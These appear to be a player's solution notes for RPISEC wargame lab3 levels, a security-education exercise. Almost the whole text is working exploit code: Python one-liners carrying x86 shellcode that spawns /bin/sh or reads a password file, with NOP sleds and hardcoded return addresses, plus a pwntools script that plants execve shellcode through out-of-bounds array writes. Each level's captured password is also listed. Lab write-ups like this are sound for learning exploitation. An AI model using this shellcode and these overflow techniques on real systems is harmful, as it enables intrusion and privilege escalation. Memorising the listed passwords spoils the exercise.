lab3C:

python -c 'print "rpisec\n" + "\x90"*9 + "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x0c\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90"*16 + "\x40\xf6\xff\xbf"' > pay2

run it using (cat /tmp/pay2; cat) | ./lab3C   (this made me stuck even i though had everything right)
pass: th3r3_iz_n0_4dm1ns_0n1y_U!

lab3B:

write your own assembly code to open /home/lab3A/.pass by overflowing the buffer

python -c 'print "\x90"*56 + "\x31\xc0\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\x89\xe3\xb0\x05\x31\xc9\x31\xd2" + "\x90"*18  + "\x90"*50 + "\xef\xbe\xad\xde"'  (unfortunatly didnt work as the program is not working....but worked inside gdb...also the read assembly code is tested seperatly and it read the pass file)

pass: wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd

lab3A:

array is allocated without any proper check

we overwite the eip

0xbffff6dc - 0xbffff528

with use jumps to overcome the nullbytes

python3 /tmp/exp.py 0xbffff50c

pass: sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps


from pwn import *

def store(p,val,index):
    p.sendline("store")
    p.recv(100)
    p.sendline(str(val))
    p.recv(100)
    p.sendline(str(index))
    print(p.recv(100))

p = process("./lab3A")
p.recv(1000)

addr = int(sys.argv[1], 16)
store(p,addr, 109)

store(p, 0x90909090, 1)
store(p, 0x04eb9090, 2)

store(p, 0x90909090, 4)
store(p, 0x04eb9090, 5)

store(p, 0x90909090, 7)
store(p, 0x90909090, 8)

store(p, 0x90909090, 10)
store(p, 0x04eb9090, 11)

store(p, 0x90909090, 13)
store(p, 0x04eb9090, 14)

store(p, 0x9050c031, 16) # xor eax, eax; push eax
store(p, 0x04eb9090, 17)

store(p, 0x732f2f68, 19) # push 0x68732f2f
store(p, 0x04eb9068, 20)

store(p, 0x69622f68, 22) # push 0x6e69622f
store(p, 0x04eb906e, 23)

store(p, 0xc189e389, 25) # mov ebx, esb; mov ecx, eax; mov edx, eax
store(p, 0x04ebc289, 26)

store(p, 0x80cd0bb0, 28)

p.sendline("quit")
p.interactive()



